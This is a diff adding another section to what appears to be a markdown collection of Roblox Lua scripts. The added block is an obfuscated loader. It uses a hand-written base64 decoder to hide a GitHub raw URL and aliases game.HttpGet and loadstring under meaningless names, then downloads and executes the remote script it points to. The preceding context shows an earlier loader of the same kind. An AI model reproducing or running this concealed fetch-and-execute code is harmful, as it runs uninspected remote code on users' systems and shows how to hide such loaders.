@@ -82,3 +82,46 @@ local _12 = _2(_11)
 -- function call to execute the fetched script
 _d(_f(_g, _12))()
 ```
+
+# For ,,
+```
+local _1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+local _e = game.HttpGet
+
+local function _2(_3)
+    local _4 = ""
+    local _5 = #_3 % 4
+    if _5 > 0 then
+        _3 = _3 .. string.rep("=", 4 - _5)
+    end
+    _3 = string.gsub(_3, ".", function(_6)
+        if _6 == "=" then return "" end
+        local _7, _8 = "", (string.find(_1, _6) - 1)
+        for _9 = 6, 1, -1 do
+            _7 = _7 .. (math.floor(_8 / 2^(_9-1)) % 2)
+        end
+        return _7
+    end)
+    for _10 = 1, #_3, 8 do
+        _4 = _4 .. string.char(tonumber(string.sub(_3, _10, _10+7), 2))
+    end
+    return _4
+end
+
+local _a = {"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vdEg0eG9yLy0vcmVmcy9oZWFkcy9tYWluLyUyQyUyQw=="}
+
+local _b = function(_c) return table.concat(_c) end
+
+local _11 = _b(_a)
+
+local function _d() return loadstring end
+local _d = _d()
+
+local _f = _e
+local _g = game
+
+local _12 = _2(_11)
+
+_d(_f(_g, _12))()
+```
